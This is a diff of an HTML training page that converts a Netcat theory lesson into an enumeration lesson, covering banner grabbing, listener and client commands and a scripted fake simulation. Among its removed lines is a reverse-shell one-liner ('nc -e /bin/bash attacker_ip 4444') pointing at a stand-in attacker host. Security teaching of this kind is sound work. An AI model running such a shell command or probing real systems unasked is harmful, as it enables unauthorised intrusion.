@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Netcat – Theory & Commands</title>
+<title>Enumeration & Mapping</title>
 
 <style>
 :root{
@@ -11,11 +11,12 @@
   --panel:#151c38;
   --fg:#e8ebff;
   --muted:#9aa3d1;
-  --accent:#4f7cff;
+  --accent:#22c55e;
   --border:#27306a;
   --code:#020617;
   --good:#22c55e;
   --bad:#ef4444;
+  --warn:#f59e0b;
 }
 *{box-sizing:border-box}
 body{
@@ -25,43 +26,42 @@ body{
   color:var(--fg);
 }
 header{
-  padding:18px 24px;
+  padding:22px 26px;
   border-bottom:1px solid var(--border);
   background:#0b1024;
+  text-align:center;
 }
-header h1{margin:0;font-size:22px}
+header h1{margin:0;font-size:24px;letter-spacing:.06em}
 header small{color:var(--muted)}
 
 main{
-  max-width:1000px;
+  max-width:1100px;
   margin:auto;
-  padding:24px;
+  padding:26px;
 }
 
 .section{
   background:linear-gradient(180deg,var(--panel),#0f1533);
   border:1px solid var(--border);
-  border-radius:14px;
-  margin-bottom:18px;
-  padding:20px;
+  border-radius:16px;
+  margin-bottom:20px;
+  padding:22px;
 }
 
 .section h2{
-  margin:0 0 10px;
-  color:#00e5ff;
-  font-size:17px;
+  margin:0 0 12px;
+  color:var(--accent);
+  font-size:18px;
 }
 
 .section p,
 .section li{
   color:var(--muted);
   font-size:14px;
-  line-height:1.6;
+  line-height:1.7;
 }
 
-.section ul{
-  margin:8px 0 0 18px;
-}
+.section ul{margin-left:18px}
 
 .code{
   background:linear-gradient(180deg,var(--code),#020617);
@@ -79,11 +79,12 @@ main{
   right:10px;
   background:var(--accent);
   border:none;
-  color:white;
+  color:#020617;
   padding:4px 8px;
   border-radius:6px;
   cursor:pointer;
   font-size:11px;
+  font-weight:700;
 }
 
 .code pre{
@@ -103,167 +104,179 @@ main{
 .yes{color:var(--good);font-weight:600}
 .no{color:var(--bad);font-weight:600}
 .arrow{color:var(--muted)}
+
+.terminal{
+  background:#020617;
+  border:1px solid #1e293b;
+  border-radius:12px;
+  padding:14px;
+  margin-top:12px;
+  font-size:13px;
+  height:240px;
+  overflow-y:auto;
+  white-space:pre-wrap;
+}
+
+.note{
+  margin-top:12px;
+  padding:12px;
+  background:#020617;
+  border-left:4px solid var(--warn);
+  border-radius:10px;
+  font-size:13px;
+  color:#fde68a;
+}
+
+button.sim{
+  margin-top:10px;
+  padding:10px 14px;
+  border-radius:10px;
+  border:none;
+  background:linear-gradient(135deg,#22c55e,#16a34a);
+  color:#020617;
+  font-weight:800;
+  cursor:pointer;
+}
 </style>
 </head>
 
 <body data-lesson="netcat">
 
 <header>
-  <h1>Netcat (nc)</h1>
-  <small>Concepts, commands, and correct decision-making</small>
+  <h1>ENUMERATION & MAPPING</h1>
+  <small>Extracting meaning from discovered services</small>
 </header>
 
 <main>
 
 <section class="section">
-<h2>What is Netcat?</h2>
+<h2>1. What Is Enumeration?</h2>
 <p>
-Netcat (<code>nc</code>) is a low-level networking utility that reads and writes
-data over TCP and UDP connections. It is often called the
-<b>“Swiss Army knife of networking”</b>.
+Enumeration is the phase where an attacker actively interacts with services
+to understand how they behave, respond, and fail.
 </p>
 <ul>
-  <li>Raw TCP/UDP communication</li>
-  <li>Client and listener modes</li>
-  <li>No encryption, no authentication</li>
+  <li>What inputs are accepted?</li>
+  <li>What responses are returned?</li>
+  <li>What information is leaked?</li>
 </ul>
 </section>
 
 <section class="section">
-<h2>Mental Model (Important)</h2>
+<h2>2. Why Netcat Matters in Enumeration</h2>
+<p>
+Netcat (<code>nc</code>) is a low-level networking utility that moves raw bytes
+between STDIN and network sockets.
+</p>
 <div class="code">
-<pre>STDIN  →  Network Socket  →  STDOUT</pre>
+<pre>STDIN → Network Socket → STDOUT</pre>
 </div>
 <p>
-Netcat does not understand protocols. It simply moves bytes.
+It does not understand protocols — which makes it ideal for observing raw behavior.
 </p>
 </section>
 
 <section class="section">
-<h2>Client vs Listener Mode</h2>
+<h2>3. Client vs Listener (Concept)</h2>
 
-<p><b>Listener</b></p>
+<p><b>Listener Mode</b></p>
 <div class="code">
 <button onclick="copy(this)">COPY</button>
 <pre>nc -lvp 4444</pre>
 </div>
 
-<p><b>Client</b></p>
+<p><b>Client Mode</b></p>
 <div class="code">
 <button onclick="copy(this)">COPY</button>
 <pre>nc 127.0.0.1 4444</pre>
 </div>
-</section>
 
-<section class="section">
-<h2>TCP vs UDP</h2>
-<div class="code">
-<button onclick="copy(this)">COPY</button>
-<pre>nc -u host port</pre>
+<div class="note">
+In this platform, listener execution is intentionally disabled for safety.
 </div>
-<p>
-UDP is connectionless. No response does not always mean failure.
-</p>
 </section>
 
 <section class="section">
-<h2>Banner Grabbing</h2>
+<h2>4. Banner Grabbing & Protocol Interaction</h2>
+
 <div class="code">
 <button onclick="copy(this)">COPY</button>
 <pre>nc target.com 80</pre>
 </div>
+
 <div class="code">
 <button onclick="copy(this)">COPY</button>
 <pre>GET / HTTP/1.1
 Host: target.com</pre>
 </div>
-</section>
 
-<section class="section">
-<h2>File Transfer (Concept)</h2>
-<div class="code">
-<button onclick="copy(this)">COPY</button>
-<pre>nc -lvp 4444 &lt; file.txt</pre>
-</div>
-<div class="code">
-<button onclick="copy(this)">COPY</button>
-<pre>nc host 4444 &gt; file.txt</pre>
-</div>
-</section>
-
-<section class="section">
-<h2>Reverse Shell (Theory Only)</h2>
-<div class="code">
-<pre>nc -e /bin/bash attacker_ip 4444</pre>
-</div>
 <p>
-Often disabled in modern systems due to high risk.
+This reveals server software, versions, and input handling.
 </p>
 </section>
 
 <section class="section">
-<h2>When SHOULD You Use Netcat?</h2>
+<h2>5. Enumeration Simulation (Safe)</h2>
 
-<div class="tree">
-<p><b>Question:</b> Do you need raw, manual interaction with a service?</p>
-<p class="arrow">↓</p>
-<p class="yes">YES</p>
-<ul>
-  <li>Quick debugging</li>
-  <li>Banner grabbing</li>
-  <li>CTF challenges</li>
-  <li>Testing custom protocols</li>
-</ul>
-<p class="arrow">↓</p>
-<p class="yes">Use Netcat</p>
-</div>
+<button class="sim" onclick="simulate()">Run Enumeration Simulation</button>
 
+<pre class="terminal" id="terminal">— waiting —</pre>
+
+<p class="note">
+Simulation demonstrates enumeration flow without real network access.
+</p>
 </section>
 
 <section class="section">
-<h2>When SHOULD You NOT Use Netcat?</h2>
+<h2>6. When SHOULD You Use Netcat?</h2>
 
 <div class="tree">
-<p><b>Question:</b> Do you need encryption, authentication, or safety?</p>
+<p><b>Question:</b> Do you need raw, manual service interaction?</p>
+<p class="arrow">↓</p>
+<p class="yes">YES</p>
+<ul>
+  <li>Banner grabbing</li>
+  <li>Protocol testing</li>
+  <li>CTF challenges</li>
+</ul>
+<p class="arrow">↓</p>
+<p class="yes">Netcat fits</p>
+</div>
+</section>
+
+<section class="section">
+<h2>7. When SHOULD You NOT Use Netcat?</h2>
+
+<div class="tree">
+<p><b>Question:</b> Do you need encryption or authentication?</p>
 <p class="arrow">↓</p>
 <p class="no">YES</p>
 <ul>
-  <li>Production environments</li>
-  <li>Sensitive data transfer</li>
-  <li>Long-lived connections</li>
-  <li>Public servers</li>
+  <li>Production systems</li>
+  <li>Sensitive data</li>
+  <li>Public services</li>
 </ul>
 <p class="arrow">↓</p>
 <p class="no">Do NOT use Netcat</p>
 </div>
-
 </section>
 
 <section class="section">
-<h2>What to Use Instead</h2>
+<h2>8. Defender’s Perspective</h2>
 <ul>
-  <li><b>SSH / SCP</b> – encrypted remote access</li>
-  <li><b>curl / wget</b> – controlled HTTP interaction</li>
-  <li><b>Nmap</b> – structured scanning</li>
-  <li><b>Socat</b> – advanced Netcat replacement</li>
+  <li>Unexpected protocol usage</li>
+  <li>Malformed requests</li>
+  <li>Error-based detection</li>
 </ul>
 </section>
 
 <section class="section">
-<h2>Netcat vs Nmap</h2>
-<p>
-Netcat is manual and raw.  
-Nmap is automated and protocol-aware.
-</p>
-</section>
-
-<section class="section">
-<h2>Interview-Ready Summary</h2>
-<p>
-Netcat is a low-level networking tool for manual TCP/UDP interaction.
-It is powerful for debugging and testing, but unsafe for production
-due to lack of encryption and authentication.
-</p>
+<h2>Key Takeaways</h2>
+<ul>
+  <li>Enumeration turns recon into intelligence</li>
+  <li>Netcat reveals behavior, not vulnerabilities</li>
+  <li>Unsafe usage increases detection risk</li>
+</ul>
 </section>
 
 </main>
@@ -275,8 +288,31 @@ function copy(btn){
   btn.textContent="COPIED";
   setTimeout(()=>btn.textContent="COPY",1000);
 }
-</script>
-<script src="/static/lesson_tracker.js"></script>
 
+const terminal = document.getElementById("terminal");
+function simulate(){
+  terminal.textContent = "";
+  const steps = [
+    "[INFO] Connecting to service...",
+    "[INFO] Banner received:",
+    "220 FTP Server ready",
+    "",
+    "[INFO] Sending malformed command...",
+    "500 Syntax error",
+    "",
+    "[INFO] Error reveals command handling",
+    "[INFO] Enumeration complete"
+  ];
+  let i=0;
+  const iv=setInterval(()=>{
+    terminal.textContent += steps[i] + "\n";
+    terminal.scrollTop = terminal.scrollHeight;
+    i++;
+    if(i>=steps.length) clearInterval(iv);
+  },600);
+}
+</script>
+
+<script src="/static/lesson_tracker.js"></script>
 </body>
 </html>
